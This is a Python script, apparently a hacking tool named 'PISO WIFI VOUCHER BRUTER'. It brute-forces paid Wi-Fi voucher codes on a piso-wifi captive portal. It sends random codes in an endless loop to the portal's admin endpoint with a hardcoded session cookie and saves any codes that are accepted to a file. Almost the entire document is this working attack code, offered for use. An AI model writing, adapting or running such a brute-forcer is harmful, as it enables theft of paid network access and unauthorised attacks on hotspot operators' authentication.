#C0DED BY: 0XBIT
import warnings
warnings.filterwarnings('ignore')
import requests
import random
import string
from tabulate import tabulate
import sys, os
from pystyle import *
import threading

dark = Col.dark_gray
purple = Colors.StaticMIX((Col.purple, Col.blue))

os.system('clear')

banner = r'''
                                                  
                            
                    ▓▓▓▓▓▓██                      
                    ▓▓▓▓▓▓▓▓▓▓▓▓██                
                  ▓▓░░██░░░░░░▓▓██                
                ░░░░░░██▒▒██░░██      I SEE VOUCHER             
                  ░░░░░░░░░░░░▒▒▒▒    I SEE VOUCHER            
                  ▓▓▓▓▓▓▓▓▓▓░░░░▒▒    I SEE VOUCHER            
                  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓                  
                  ░░▓▓▓▓░░▓▓▓▓▓▓                  
                ██▒▒▓▓▓▓▒▒░░▓▓▓▓                  
                ▓▓░░▓▓▓▓▓▓▓▓░░                    
                ░░░░▓▓▓▓▓▓░░░░                    
                    ░░░░░░░░       CODED BY: 0XBIT     
                                                  

                    
'''

text_banner = '''        ╒═══════════════════════════╕
         │ PISO WIFI VOUCHER BRUTER  │
         ╘═══════════════════════════╛'''

host = 'http://10.0.0.1/admin/index?svouchers=1'

headers = {'Cookie':'PHPSESSID=4i446cddqg0ucu972tij8jpa72; cmac=c2%3A55%B3ca%3Afe%3A4a%3A32',
            'Host': '10.0.0.1',
            'Origin': 'http://10.0.0.1',
            'Referer': 'http://10.0.0.1/',
            'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'}

def generate_voucher(length, uppercase, v_type):
    if uppercase.lower() == 'yes':
        if v_type == 'voucher_3':
            chars = string.ascii_uppercase + string.digits + string.punctuation
        elif v_type == 'voucher_2':
            chars = string.ascii_uppercase + string.digits
        elif v_type == 'voucher_1':
            chars = string.ascii_uppercase
        else:
            raise ValueError("Invalid voucher type")
    else:
        if v_type == 'voucher_3':
            chars = string.ascii_lowercase + string.digits + string.punctuation
        elif v_type == 'voucher_2':
            chars = string.ascii_lowercase + string.digits
        elif v_type == 'voucher_1':
            chars = string.ascii_lowercase
        else:
            raise ValueError("Invalid voucher type")

    return ''.join(random.choices(chars, k=int(length)))

def run_me(length, uppercase, voucher_type):
    while True:
        try:
            voucher = generate_voucher(length, uppercase, voucher_type)
            voucher_body = {'vcode': voucher}
            response = requests.post(host, headers=headers, data=voucher_body)
            res_body: str = response.text
            if res_body == 'voucher is invalid!':
                print(tabulate([['INVALID VOUCHER', f'{voucher}']], tablefmt='fancy_grid'))
            else:
                print("\033[92m" + tabulate([['VALID VOUCHER', f'{voucher}']], tablefmt='fancy_grid') + "\033[0m")
                with open('valid_voucher.txt', 'a') as vc:
                    vc.write(f'{voucher}\n')
        except KeyboardInterrupt:
            sys.exit()

def menu():
    print(Colorate.Diagonal(Colors.DynamicMIX((purple, dark)), (banner)))
    print(((purple)), (text_banner))
    print()
    print(tabulate([['LENGHT OF VOUCHER']], tablefmt='fancy_grid'))
    lenght: int = input('[?] LENGHT: ')
    print(tabulate([['TYPE | YES OR NO']], tablefmt='fancy_grid'))
    uppercase: str = (input('[?] UPPERCASE: ')).lower()

    data = [
    ['TYPE','TYPE OF VOUCHER'],
    ['voucher_1', 'A voucher consisting of alphabetic characters only.'],
    ['voucher_2', 'A voucher containing alphabetic characters and digits.'],
    ['voucher_3', 'A voucher with a mix of alphabetic characters, digits, and special symbols.']
]
    print(tabulate(data, headers='firstrow', tablefmt='fancy_grid'))
    voucher_type: str = input('[?] TYPE: ')

    run_me(lenght, uppercase, voucher_type)

    main_thread = threading.Thread(target=run_me)
    main_thread.daemon = True
    main_thread.start()

if __name__ == '__main__':
    menu()